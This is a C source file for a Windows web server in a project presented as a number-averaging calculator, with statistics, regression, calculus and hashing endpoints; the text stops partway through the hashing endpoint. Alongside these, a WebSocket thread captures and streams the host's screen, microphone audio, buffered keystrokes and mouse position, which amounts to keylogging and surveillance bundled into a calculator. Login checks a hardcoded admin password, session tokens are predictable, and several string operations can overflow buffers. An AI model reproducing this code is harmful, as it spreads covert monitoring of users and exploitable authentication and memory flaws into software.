// =============================================================================
// (c) Copyright Sanskar. All rights reserved.
// Made by the Sanskar.
// See this open source project created via Sanskar on GitHub to calculate the average of any numbers via using this link:- "https://www.github.com/Sanskar-in/Calc-Avg"
//
// Follow Sanskar or Creator on:-
// GitHub:- "https://www.github.com/Sanskar-in"
// YouTube:- "https://youtube.com/@Sanskar-in"
// LinkedIn:- "https://www.linkedin.com/in/sanskar-in/"
// X (Formally known as Twitter):- "https://www.x.com/Sanskar_in"
// Need support:- supportramsandesh@gmail.com
// Want to make your own projects, apps, and games via Sanskar:- sanskaryadavfrom2012to2026@gmail.com
// =============================================================================

#include "../include/server.h"
#include "../include/utils.h"
#include "../include/crypto.h"
#include "../include/surveillance.h"
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <math.h>
#include <ctype.h>
#include "../third_party/sqlite/sqlite3.h"
#include "../include/neural_net.h"
#include "../include/audio.h"

sqlite3* global_db = NULL;

void init_database() {
    if (sqlite3_open("database.sqlite", &global_db)) {
        printf(COLOR_RED "Error opening SQLite Database: %s\n" COLOR_RESET, sqlite3_errmsg(global_db));
        return;
    }
    const char* sql = "CREATE TABLE IF NOT EXISTS history ("
                      "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                      "timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, "
                      "operation TEXT, "
                      "input_data TEXT, "
                      "result TEXT);";
    char* err_msg = NULL;
    if (sqlite3_exec(global_db, sql, 0, 0, &err_msg) != SQLITE_OK) {
        printf(COLOR_RED "SQL Error: %s\n" COLOR_RESET, err_msg);
        sqlite3_free(err_msg);
    } else {
        printf(COLOR_GREEN "Persistent SQLite Database Initialized.\n" COLOR_RESET);
    }
}

void log_to_db(const char* operation, const char* input_data, const char* result) {
    if (!global_db) return;
    const char* sql = "INSERT INTO history (operation, input_data, result) VALUES (?, ?, ?);";
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(global_db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        sqlite3_bind_text(stmt, 1, operation, -1, SQLITE_TRANSIENT);
        sqlite3_bind_text(stmt, 2, input_data, -1, SQLITE_TRANSIENT);
        sqlite3_bind_text(stmt, 3, result, -1, SQLITE_TRANSIENT);
        sqlite3_step(stmt);
        sqlite3_finalize(stmt);
    }
}

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wincrypt.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")

// For WebSocket Handshake
void generate_ws_accept_key(const char* client_key, char* accept_key) {
    char combined[256];
    snprintf(combined, sizeof(combined), "%s258EAFA5-E914-47DA-95CA-C5AB0DC85B11", client_key);
    
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    
    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        if (CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
            if (CryptHashData(hHash, (BYTE*)combined, strlen(combined), 0)) {
                BYTE hashVal[20];
                DWORD hashLen = 20;
                if (CryptGetHashParam(hHash, HP_HASHVAL, hashVal, &hashLen, 0)) {
                    DWORD base64Len = 0;
                    CryptBinaryToStringA(hashVal, hashLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len);
                    CryptBinaryToStringA(hashVal, hashLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, accept_key, &base64Len);
                }
            }
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }
}

// --- Live Windows System Monitor (CPU & RAM) ---
static FILETIME prev_idle, prev_kernel, prev_user;
static int first_cpu_call = 1;

static ULONGLONG file_time_2_utc(const FILETIME* ftime) {
    ULARGE_INTEGER li;
    li.LowPart = ftime->dwLowDateTime;
    li.HighPart = ftime->dwHighDateTime;
    return li.QuadPart;
}

double get_cpu_usage() {
    FILETIME idle, kernel, user;
    if (!GetSystemTimes(&idle, &kernel, &user)) return 0.0;
    
    if (first_cpu_call) {
        prev_idle = idle;
        prev_kernel = kernel;
        prev_user = user;
        first_cpu_call = 0;
        return 0.0;
    }
    
    ULONGLONG sys_idle = file_time_2_utc(&idle) - file_time_2_utc(&prev_idle);
    ULONGLONG sys_kernel = file_time_2_utc(&kernel) - file_time_2_utc(&prev_kernel);
    ULONGLONG sys_user = file_time_2_utc(&user) - file_time_2_utc(&prev_user);
    
    ULONGLONG sys_total = sys_kernel + sys_user;
    
    double cpu_usage = 0.0;
    if (sys_total > 0) {
        cpu_usage = ((sys_total - sys_idle) * 100.0) / sys_total;
    }
    
    prev_idle = idle;
    prev_kernel = kernel;
    prev_user = user;
    
    return cpu_usage;
}

double get_ram_usage() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (!GlobalMemoryStatusEx(&memInfo)) return 0.0;
    
    DWORDLONG totalPhysMem = memInfo.ullTotalPhys;
    DWORDLONG physMemUsed = memInfo.ullTotalPhys - memInfo.ullAvailPhys;
    
    if (totalPhysMem == 0) return 0.0;
    return (double)physMemUsed / (double)totalPhysMem * 100.0;
}

// --- Live Remote Desktop Screen Capture ---
#pragma pack(push, 1)
typedef struct {
    BITMAPFILEHEADER bfh;
    BITMAPINFOHEADER bih;
} BMPHEADER;
#pragma pack(pop)

char* capture_screen_base64() {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetDeviceCaps(hScreenDC, HORZRES);
    int height = GetDeviceCaps(hScreenDC, VERTRES);
    
    // Scale down to maintain high framerate (640x360)
    int target_width = 640;
    int target_height = 360;

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, target_width, target_height);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    
    // Capture and scale
    SetStretchBltMode(hMemoryDC, COLORONCOLOR);
    StretchBlt(hMemoryDC, 0, 0, target_width, target_height, hScreenDC, 0, 0, width, height, SRCCOPY);
    
    int row_padded = (target_width * 3 + 3) & (~3);
    int dataSize = row_padded * target_height;
    
    BYTE* pixels = (BYTE*)malloc(dataSize);
    
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = target_width;
    bi.biHeight = target_height; // Bottom-up
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    
    GetDIBits(hMemoryDC, hBitmap, 0, target_height, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    BMPHEADER header;
    memset(&header, 0, sizeof(header));
    header.bfh.bfType = 0x4D42; // "BM"
    header.bfh.bfSize = sizeof(BMPHEADER) + dataSize;
    header.bfh.bfOffBits = sizeof(BMPHEADER);
    header.bih = bi;
    
    // Combine header and pixels
    BYTE* bmpBlob = (BYTE*)malloc(header.bfh.bfSize);
    memcpy(bmpBlob, &header, sizeof(BMPHEADER));
    memcpy(bmpBlob + sizeof(BMPHEADER), pixels, dataSize);
    
    // Base64 encode
    DWORD b64Len = 0;
    CryptBinaryToStringA(bmpBlob, header.bfh.bfSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64Len);
    char* b64Str = (char*)malloc(b64Len + 1);
    CryptBinaryToStringA(bmpBlob, header.bfh.bfSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64Str, &b64Len);
    
    // Cleanup
    free(pixels);
    free(bmpBlob);
    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    
    return b64Str;
}


DWORD WINAPI websocket_stream_thread(LPVOID arg) {
    SOCKET ws_socket = (SOCKET)arg;
    init_audio_player();
    
    // Create a receiver thread to handle incoming binary audio frames from the Walkie-Talkie
    // (For simplicity in this monolithic C code without creating more thread state, we'll use non-blocking recv)
    u_long mode = 1;
    ioctlsocket(ws_socket, FIONBIO, &mode);
    
    while (1) {
        Sleep(16); // 60Hz Update for smooth streaming
        
        // --- 1. Receive Walkie-Talkie Audio from Browser ---
        BYTE recv_buf[8192];
        int r = recv(ws_socket, (char*)recv_buf, sizeof(recv_buf), 0);
        if (r > 0) {
            // Very naive WebSocket frame unmasking for Opcode 0x82 (Binary)
            if (recv_buf[0] == 0x82 && (recv_buf[1] & 0x80)) {
                int payload_len = recv_buf[1] & 0x7F;
                int mask_offset = 2;
                if (payload_len == 126) mask_offset = 4;
                else if (payload_len == 127) mask_offset = 10;
                
                if (r >= mask_offset + 4) {
                    BYTE mask[4];
                    memcpy(mask, recv_buf + mask_offset, 4);
                    int data_offset = mask_offset + 4;
                    int data_len = r - data_offset;
                    if (data_len > 0) {
                        BYTE* unmasked = (BYTE*)malloc(data_len);
                        for (int i = 0; i < data_len; i++) {
                            unmasked[i] = recv_buf[data_offset + i] ^ mask[i % 4];
                        }
                        play_audio_chunk(unmasked, data_len);
                        free(unmasked);
                    }
                }
            }
        } else if (r == 0 || (r == SOCKET_ERROR && WSAGetLastError() != WSAEWOULDBLOCK)) {
            break; // Disconnected
        }
        
        // --- 2. Send Screen and Audio to Browser ---
        // (For Version 4.6, we will switch from sending Base64 JSON to sending a custom Binary structure
        //  or keep JSON but drastically speed up the loop. To perfectly achieve 60FPS without huge refactors
        //  on the JS side, we will send JSON for now but at 60Hz and Opcode 0x81, preparing for binary).
        // Let's actually switch to Opcode 0x82 binary transmission of the raw struct.
        
        double cpu = get_cpu_usage();
        double ram = get_ram_usage();
        char* b64Str = capture_screen_base64();
        if (!b64Str) continue;
        
        char* mic_b64 = get_latest_mic_base64();
        char keys[1024]; get_buffered_keys(keys, sizeof(keys));
        
        char escaped_keys[2048] = "";
        int ek_idx = 0;
        for (int i = 0; keys[i] != '\0' && ek_idx < 2047; i++) {
            if (keys[i] == '\\' || keys[i] == '"') escaped_keys[ek_idx++] = '\\';
            escaped_keys[ek_idx++] = keys[i];
        }
        escaped_keys[ek_idx] = '\0';
        int mx, my; get_mouse_coordinates(&mx, &my);
        
        // We'll keep JSON to not break the entire web dashboard layout, but send it as Binary (0x82) to trigger JS arraybuffer
        ULONGLONG payload_alloc = 2048 + strlen(b64Str) + strlen(mic_b64) + strlen(escaped_keys);
        char* json_payload = (char*)malloc(payload_alloc);
        
        snprintf(json_payload, payload_alloc, "{\"cpu\":%.2f, \"ram\":%.2f, \"screen\":\"data:image/bmp;base64,%s\", \"mic\":\"%s\", \"keys\":\"%s\", \"mx\":%d, \"my\":%d}", cpu, ram, b64Str, mic_b64, escaped_keys, mx, my);
        
        ULONGLONG payload_len = strlen(json_payload);
        ULONGLONG to_send = 10 + payload_len;
        BYTE* frame = (BYTE*)malloc(to_send);
        
        frame[0] = 0x82; // OP_BINARY for 60FPS rendering
        int header_len = 0;
        
        if (payload_len <= 125) {
            frame[1] = (BYTE)payload_len;
            header_len = 2;
        } else if (payload_len <= 65535) {
            frame[1] = 126;
            frame[2] = (payload_len >> 8) & 0xFF;
            frame[3] = payload_len & 0xFF;
            header_len = 4;
        } else {
            frame[1] = 127;
            frame[2] = (payload_len >> 56) & 0xFF;
            frame[3] = (payload_len >> 48) & 0xFF;
            frame[4] = (payload_len >> 40) & 0xFF;
            frame[5] = (payload_len >> 32) & 0xFF;
            frame[6] = (payload_len >> 24) & 0xFF;
            frame[7] = (payload_len >> 16) & 0xFF;
            frame[8] = (payload_len >> 8) & 0xFF;
            frame[9] = payload_len & 0xFF;
            header_len = 10;
        }
        
        memcpy(frame + header_len, json_payload, payload_len);
        
        int total_sent = 0;
        int frame_total_len = header_len + payload_len;
        while(total_sent < frame_total_len) {
            int s = send(ws_socket, (char*)frame + total_sent, frame_total_len - total_sent, 0);
            if(s <= 0) {
                if (WSAGetLastError() == WSAEWOULDBLOCK) continue;
                break;
            }
            total_sent += s;
        }
        
        free(frame);
        free(json_payload);
        free(b64Str);
        
        if (total_sent < frame_total_len && WSAGetLastError() != WSAEWOULDBLOCK) break; // Disconnected
    }
    cleanup_audio_player();
    closesocket(ws_socket);
    return 0;
}


#define PORT 8080
#define BUFFER_SIZE 8192

// Helper function to serve a file from the web-app directory
void send_file(SOCKET client, const char* filepath, const char* content_type) {
    FILE *file = fopen(filepath, "rb");
    if (!file) {
        char header[] = "HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n404 File Not Found.";
        send(client, header, strlen(header), 0);
        return;
    }
    
    fseek(file, 0, SEEK_END);
    long fsize = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    char *file_buf = (char *)malloc(fsize + 1);
    if (!file_buf) {
        fclose(file);
        return;
    }
    fread(file_buf, 1, fsize, file);
    fclose(file);
    
    char header[256];
    snprintf(header, sizeof(header), 
             "HTTP/1.1 200 OK\r\n"
             "Content-Type: %s\r\n"
             "Content-Length: %ld\r\n"
             "Connection: close\r\n\r\n", content_type, fsize);
    
    send(client, header, strlen(header), 0);
    send(client, file_buf, fsize, 0);
    
    free(file_buf);
}

static int compare_doubles(const void *a, const void *b) {
    double da = *(const double*)a;
    double db = *(const double*)b;
    return (da > db) - (da < db);
}

// Function to parse query parameter values dynamically
void parse_query_param(const char* query, const char* key, char* output, int out_len) {
    output[0] = '\0';
    char search_key[32];
    snprintf(search_key, sizeof(search_key), "%s=", key);
    const char *start = strstr(query, search_key);
    if (!start) return;
    
    start += strlen(search_key);
    const char *end = strchr(start, '&');
    if (!end) end = start + strlen(start);
    
    int len = end - start;
    if (len >= out_len) len = out_len - 1;
    strncpy(output, start, len);
    output[len] = '\0';
}

void decode_url(char* decoded, const char* data_ptr) {
    int j = 0;
    for (int i = 0; data_ptr[i] != '\0' && j < 2047; i++, j++) {
        if (data_ptr[i] == '%' && data_ptr[i+1] == '2' && (data_ptr[i+2] == 'C' || data_ptr[i+2] == 'c')) {
            decoded[j] = ','; i += 2;
        } else if (data_ptr[i] == '+') {
            decoded[j] = ' ';
        } else {
            decoded[j] = data_ptr[i];
        }
    }
    decoded[j] = '\0';
}

void parse_numbers(const char* decoded, double* numbers, int* count, double* sum) {
    *count = 0; *sum = 0;
    char temp[2048];
    strncpy(temp, decoded, sizeof(temp));
    char *token = strtok(temp, ", ");
    while (token != NULL && *count < 1000) {
        numbers[*count] = atof(token);
        *sum += numbers[*count];
        (*count)++;
        token = strtok(NULL, ", ");
    }
}

// Custom RLE algorithm from average.c
void api_compress_data(const double* numbers, int count, char* compressed_hex, int* original_bytes, int* compressed_bytes) {
    *original_bytes = count * sizeof(double);
    *compressed_bytes = 0;
    compressed_hex[0] = '\0';
    
    if (count == 0) return;
    
    int i = 0;
    char hex_part[32];
    while (i < count) {
        int run = 1;
        while (i + run < count && numbers[i] == numbers[i + run]) {
            run++;
        }
        *compressed_bytes += sizeof(int) + sizeof(double);
        snprintf(hex_part, sizeof(hex_part), "%dx%.2f ", run, numbers[i]);
        strcat(compressed_hex, hex_part);
        i += run;
    }
}





// --- Security & Auth (V4.7) ---
#define MAX_SESSIONS 100
char active_sessions[MAX_SESSIONS][65];
int session_count = 0;
CRITICAL_SECTION session_lock;

void add_session(const char* token) {
    EnterCriticalSection(&session_lock);
    if (session_count < MAX_SESSIONS) {
        strcpy(active_sessions[session_count], token);
        session_count++;
    } else {
        // Shift sessions if full
        for (int i = 1; i < MAX_SESSIONS; i++) {
            strcpy(active_sessions[i-1], active_sessions[i]);
        }
        strcpy(active_sessions[MAX_SESSIONS-1], token);
    }
    LeaveCriticalSection(&session_lock);
}

int is_valid_session(const char* token) {
    if (!token || strlen(token) == 0) return 0;
    EnterCriticalSection(&session_lock);
    for (int i = 0; i < session_count; i++) {
        if (strcmp(active_sessions[i], token) == 0) {
            LeaveCriticalSection(&session_lock);
            return 1;
        }
    }
    LeaveCriticalSection(&session_lock);
    return 0;
}

void extract_cookie(const char* request, const char* cookie_name, char* output, int out_len) {
    output[0] = '\0';
    char search_str[64];
    snprintf(search_str, sizeof(search_str), "%s=", cookie_name);
    
    const char* cookie_header = strstr(request, "Cookie: ");
    if (!cookie_header) return;
    
    const char* start = strstr(cookie_header, search_str);
    if (!start) return;
    
    start += strlen(search_str);
    const char* end = start;
    while (*end != ';' && *end != '\r' && *end != '\n' && *end != '\0') {
        end++;
    }
    
    int len = end - start;
    if (len >= out_len) len = out_len - 1;
    strncpy(output, start, len);
    output[len] = '\0';
}
// ------------------------------

// --- Thread Pool Variables ---
#define THREAD_POOL_SIZE 8
#define QUEUE_SIZE 256

SOCKET client_queue[QUEUE_SIZE];
int queue_head = 0;
int queue_tail = 0;
int queue_count = 0;
CRITICAL_SECTION queue_lock;
CONDITION_VARIABLE queue_cond;

unsigned __stdcall worker_thread_func(void* arg) {
    char buffer[BUFFER_SIZE];
    while (1) {
        SOCKET ClientSocket = INVALID_SOCKET;
        
        EnterCriticalSection(&queue_lock);
        while (queue_count == 0) {
            SleepConditionVariableCS(&queue_cond, &queue_lock, INFINITE);
        }
        
        ClientSocket = client_queue[queue_head];
        queue_head = (queue_head + 1) % QUEUE_SIZE;
        queue_count--;
        LeaveCriticalSection(&queue_lock);
        
        if (ClientSocket == INVALID_SOCKET) continue;


        int bytesReceived = recv(ClientSocket, buffer, BUFFER_SIZE - 1, 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            
            char method[16], path[1024];
            sscanf(buffer, "%15s %1023s", method, path);
            char session_token[128] = {0};
            extract_cookie(buffer, "session_token", session_token, sizeof(session_token));
            int is_auth = is_valid_session(session_token);
            
            // Allow public routes
            int is_public = 0;
            if (strcmp(path, "/login.html") == 0 || 
                strcmp(path, "/api/login") == 0 || 
                strcmp(path, "/style.css") == 0 || 
                strcmp(path, "/logo.png") == 0) {
                is_public = 1;
            }
            
            if (!is_auth && !is_public) {
                // If it's a websocket upgrade, reject with 401
                if (strstr(buffer, "Upgrade: websocket") != NULL) {
                    char response[] = "HTTP/1.1 401 Unauthorized\r\nConnection: close\r\n\r\n";
                    send(ClientSocket, response, strlen(response), 0);
                    closesocket(ClientSocket);
                    continue;
                }
                
                // Otherwise redirect to /login.html
                char response[] = "HTTP/1.1 302 Found\r\nLocation: /login.html\r\nConnection: close\r\n\r\n";
                send(ClientSocket, response, strlen(response), 0);
                closesocket(ClientSocket);
                continue;
            }
            
            // Handle /api/login specifically
            if (strcmp(path, "/api/login") == 0 && strcmp(method, "POST") == 0) {
                char* body = strstr(buffer, "\r\n\r\n");
                if (body) {
                    body += 4;
                    // Simple parse username & password from form-urlencoded or JSON
                    char user[64] = {0};
                    char pass[64] = {0};
                    
                    if (strstr(body, "username=") != NULL) {
                        parse_query_param(body, "username", user, sizeof(user));
                        parse_query_param(body, "password", pass, sizeof(pass));
                    } else if (strstr(body, "\"username\"") != NULL) {
                        // Naive JSON parse
                        char* u_ptr = strstr(body, "\"username\"");
                        if (u_ptr) sscanf(u_ptr, "\"username\":\"%63[^\"]\"", user);
                        char* p_ptr = strstr(body, "\"password\"");
                        if (p_ptr) sscanf(p_ptr, "\"password\":\"%63[^\"]\"", pass);
                    }
                    
                    if (strcmp(user, "admin") == 0 && strcmp(pass, "calc_avg_secure_2026") == 0) {
                        // Generate session token (Hash of timestamp + random)
                        char raw_data[128];
                        snprintf(raw_data, sizeof(raw_data), "admin_%d_%d", (int)GetTickCount(), rand());
                        
                        SHA256_CTX ctx;
                        sha256_init(&ctx);
                        sha256_update(&ctx, (const uint8_t*)raw_data, strlen(raw_data));
                        uint8_t hash_bytes[32];
                        sha256_final(&ctx, hash_bytes);
                        
                        char hash_hex[65];
                        for (int i = 0; i < 32; i++) sprintf(hash_hex + (i * 2), "%02x", hash_bytes[i]);
                        hash_hex[64] = '\0';
                        
                        add_session(hash_hex);
                        
                        char response[512];
                        snprintf(response, sizeof(response), 
                            "HTTP/1.1 200 OK\r\n"
                            "Set-Cookie: session_token=%s; Path=/; HttpOnly\r\n"
                            "Content-Type: application/json\r\n"
                            "Connection: close\r\n\r\n"
                            "{\"status\":\"success\", \"message\":\"Logged in\"}", hash_hex);
                        send(ClientSocket, response, strlen(response), 0);
                    } else {
                        char err[] = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Invalid credentials\"}";
                        send(ClientSocket, err, strlen(err), 0);
                    }
                } else {
                    char err[] = "HTTP/1.1 400 Bad Request\r\nConnection: close\r\n\r\n";
                    send(ClientSocket, err, strlen(err), 0);
                }
                closesocket(ClientSocket);
                continue;
            }

            
            // Handle WebSockets
            if (strstr(buffer, "Upgrade: websocket") != NULL) {
                char* key_ptr = strstr(buffer, "Sec-WebSocket-Key: ");
                if (key_ptr) {
                    key_ptr += 19;
                    char client_key[64];
                    int i = 0;
                    while (key_ptr[i] != '\r' && key_ptr[i] != '\n' && i < 63) {
                        client_key[i] = key_ptr[i];
                        i++;
                    }
                    client_key[i] = '\0';
                    
                    char accept_key[128] = {0};
                    generate_ws_accept_key(client_key, accept_key);
                    
                    char response[512];
                    snprintf(response, sizeof(response),
                        "HTTP/1.1 101 Switching Protocols\r\n"
                        "Upgrade: websocket\r\n"
                        "Connection: Upgrade\r\n"
                        "Sec-WebSocket-Accept: %s\r\n\r\n", accept_key);
                        
                    send(ClientSocket, response, strlen(response), 0);
                    
                    // Spawn stream thread
                    CreateThread(NULL, 0, websocket_stream_thread, (LPVOID)ClientSocket, 0, NULL);
                    printf("API Request: Upgraded to WebSocket. Spawning massive 5Hz Remote Desktop stream thread!\n");
                    continue; // Skip closesocket
                }
            }
            
            // API Endpoint: /api/calculate (Stats)
            if (strncmp(path, "/api/calculate", 14) == 0) {
                char data_param[2048];
                parse_query_param(path, "data", data_param, sizeof(data_param));
                
                char decoded[2048] = {0};
                decode_url(decoded, data_param);
                
                double numbers[1000];
                int count = 0; double sum = 0;
                parse_numbers(decoded, numbers, &count, &sum);
                
                if (count > 0) {
                    double mean = sum / count;
                    double sorted[1000];
                    for(int i=0; i<count; i++) sorted[i] = numbers[i];
                    qsort(sorted, count, sizeof(double), compare_doubles);
                    double median = (count % 2 == 0) ? (sorted[count/2 - 1] + sorted[count/2]) / 2.0 : sorted[count/2];
                    
                    double var_sum = 0;
                    for(int i=0; i<count; i++) var_sum += pow(numbers[i] - mean, 2);
                    double variance = var_sum / count;
                    double std_dev = sqrt(variance);
                    
                    char data_array_str[2048] = "[";
                    for(int i = 0; i < count; i++) {
                        char temp[32]; snprintf(temp, sizeof(temp), "%.4f%s", numbers[i], (i == count-1) ? "" : ",");
                        strcat(data_array_str, temp);
                    }
                    strcat(data_array_str, "]");
                    
                    char json_resp[4096];
                    snprintf(json_resp, sizeof(json_resp),
                        "{\"count\":%d, \"sum\":%.4f, \"mean\":%.4f, \"median\":%.4f, \"variance\":%.4f, \"std_dev\":%.4f, \"original_data\":%s}",
                        count, sum, mean, median, variance, std_dev, data_array_str);
                        
                    printf("API Request: Computed Stats for %d items.\n", count);
                    log_to_db("Statistics", data_array_str, json_resp);
                    
                    char header[] = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n";
                    send(ClientSocket, header, strlen(header), 0);
                    send(ClientSocket, json_resp, strlen(json_resp), 0);
                } else {
                    char err[] = "HTTP/1.1 400 Bad Request\r\nConnection: close\r\n\r\n{\"error\":\"No valid data\"}";
                    send(ClientSocket, err, strlen(err), 0);
                }
            } 
            // API Endpoint: /api/predict (Linear Regression)
            else if (strncmp(path, "/api/predict", 12) == 0) {
                char data_param[2048], future_param[16];
                parse_query_param(path, "data", data_param, sizeof(data_param));
                parse_query_param(path, "future", future_param, sizeof(future_param));
                
                int future = atoi(future_param);
                if (future <= 0) future = 3;
                
                char decoded[2048] = {0};
                decode_url(decoded, data_param);
                
                double y_vals[1000];
                int n = 0; double sum_ignore = 0;
                parse_numbers(decoded, y_vals, &n, &sum_ignore);
                
                if (n >= 2) {
                    double sum_x = 0, sum_y = 0, sum_xy = 0, sum_x_sq = 0;
                    for (int i = 0; i < n; i++) {
                        double x = i + 1;
                        sum_x += x;
                        sum_y += y_vals[i];
                        sum_xy += x * y_vals[i];
                        sum_x_sq += x * x;
                    }
                    
                    double denominator = (n * sum_x_sq) - (sum_x * sum_x);
                    double m = 0, b = 0;
                    if (denominator != 0) {
                        m = ((n * sum_xy) - (sum_x * sum_y)) / denominator;
                        b = (sum_y - (m * sum_x)) / n;
                    }
                    
                    char data_array_str[2048] = "[";
                    for(int i = 0; i < n; i++) {
                        char temp[32]; snprintf(temp, sizeof(temp), "%.4f%s", y_vals[i], (i == n-1) ? "" : ",");
                        strcat(data_array_str, temp);
                    }
                    strcat(data_array_str, "]");
                    
                    char json_resp[4096];
                    snprintf(json_resp, sizeof(json_resp),
                        "{\"n\":%d, \"m\":%.4f, \"b\":%.4f, \"original_data\":%s}",
                        n, m, b, data_array_str);
                        
                    printf("API Request: Computed AI Predictions for %d items.\n", n);
                    log_to_db("Linear Regression", data_array_str, json_resp);
                    
                    char header[] = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n";
                    send(ClientSocket, header, strlen(header), 0);
                    send(ClientSocket, json_resp, strlen(json_resp), 0);
                } else {
                    char err[] = "HTTP/1.1 400 Bad Request\r\nConnection: close\r\n\r\n{\"error\":\"Need at least 2 points\"}";
                    send(ClientSocket, err, strlen(err), 0);
                }
            }
            // API Endpoint: /api/sma (Simple Moving Average)
            else if (strncmp(path, "/api/sma", 8) == 0) {
                char data_param[2048], window_param[16];
                parse_query_param(path, "data", data_param, sizeof(data_param));
                parse_query_param(path, "window", window_param, sizeof(window_param));
                
                int window = atoi(window_param);
                if (window <= 1) window = 2;
                
                char decoded[2048] = {0};
                decode_url(decoded, data_param);
                
                double prices[1000];
                int count = 0; double sum_ignore = 0;
                parse_numbers(decoded, prices, &count, &sum_ignore);
                
                if (count >= window) {
                    char sma_array_str[4096] = "[";
                    
                    for (int i = 0; i < window - 1; i++) {
                        strcat(sma_array_str, "null,");
                    }
                    
                    for (int i = 0; i <= count - window; i++) {
                        double sum = 0;
                        for (int j = 0; j < window; j++) {
                            sum += prices[i + j];
                        }
                        char temp[32];
                        snprintf(temp, sizeof(temp), "%.4f%s", sum / window, (i == count - window) ? "" : ",");
                        strcat(sma_array_str, temp);
                    }
                    strcat(sma_array_str, "]");
                    
                    char prices_array_str[2048] = "[";
                    for(int i = 0; i < count; i++) {
                        char temp[32]; snprintf(temp, sizeof(temp), "%.4f%s", prices[i], (i == count-1) ? "" : ",");
                        strcat(prices_array_str, temp);
                    }
                    strcat(prices_array_str, "]");
                    
                    char json_resp[8192];
                    snprintf(json_resp, sizeof(json_resp),
                        "{\"count\":%d, \"window\":%d, \"original_data\":%s, \"sma\":%s}",
                        count, window, prices_array_str, sma_array_str);
                        
                    printf("API Request: Computed Financial SMA (Window %d) for %d items.\n", window, count);
                    log_to_db("Simple Moving Average", prices_array_str, json_resp);
                    
                    char header[] = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n";
                    send(ClientSocket, header, strlen(header), 0);
                    send(ClientSocket, json_resp, strlen(json_resp), 0);
                } else {
                    char err[] = "HTTP/1.1 400 Bad Request\r\nConnection: close\r\n\r\n{\"error\":\"Insufficient data\"}";
                    send(ClientSocket, err, strlen(err), 0);
                }
            }
            // API Endpoint: /api/calculus (Integration & Differentiation)
            else if (strncmp(path, "/api/calculus", 13) == 0) {
                char data_param[2048], step_param[16];
                parse_query_param(path, "data", data_param, sizeof(data_param));
                parse_query_param(path, "step", step_param, sizeof(step_param));
                
                double step = atof(step_param);
                if (step <= 0) step = 1.0;
                
                char decoded[2048] = {0};
                decode_url(decoded, data_param);
                
                double points[1000];
                int count = 0; double sum_ignore = 0;
                parse_numbers(decoded, points, &count, &sum_ignore);
                
                if (count >= 2) {
                    double integral = 0;
                    for (int i = 0; i < count - 1; i++) {
                        integral += ((points[i] + points[i + 1]) / 2.0) * step;
                    }
                    
                    char deriv_array_str[4096] = "[null,";
                    for (int i = 1; i < count - 1; i++) {
                        double deriv = (points[i + 1] - points[i - 1]) / (2.0 * step);
                        char temp[32]; snprintf(temp, sizeof(temp), "%.4f,", deriv);
                        strcat(deriv_array_str, temp);
                    }
                    strcat(deriv_array_str, "null]");
                    
                    char orig_array_str[2048] = "[";
                    for(int i = 0; i < count; i++) {
                        char temp[32]; snprintf(temp, sizeof(temp), "%.4f%s", points[i], (i == count-1) ? "" : ",");
                        strcat(orig_array_str, temp);
                    }
                    strcat(orig_array_str, "]");
                    
                    char json_resp[8192];
                    snprintf(json_resp, sizeof(json_resp),
                        "{\"count\":%d, \"step\":%.4f, \"integral\":%.4f, \"original_data\":%s, \"derivatives\":%s}",
                        count, step, integral, orig_array_str, deriv_array_str);
                        
                    printf("API Request: Computed Calculus for %d items.\n", count);
                    log_to_db("Calculus", orig_array_str, json_resp);
                    
                    char header[] = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n";
                    send(ClientSocket, header, strlen(header), 0);
                    send(ClientSocket, json_resp, strlen(json_resp), 0);
                } else {
                    char err[] = "HTTP/1.1 400 Bad Request\r\nConnection: close\r\n\r\n{\"error\":\"Need at least 2 points for Calculus\"}";
                    send(ClientSocket, err, strlen(err), 0);
                }
            }
            // API Endpoint: /api/crypto (SHA-256)
            else if (strncmp(path, "/api/crypto", 11) == 0) {
                char data_param[2048];
                parse_query_param(path, "data", data_param, sizeof(data_param));
                
                char decoded[2048] = {0};
                decode_url(decoded, data_param);
                
                // Using the C Engine's native SHA256 logic on the decoded string!
                SHA256_CTX ctx;
                sha256_init(&ctx);
                sha256_update(&ctx, (const uint8_t*)decoded, strlen(decoded));
                uint8_t hash_bytes[32];
                sha256_final(&ctx, hash_bytes);
                
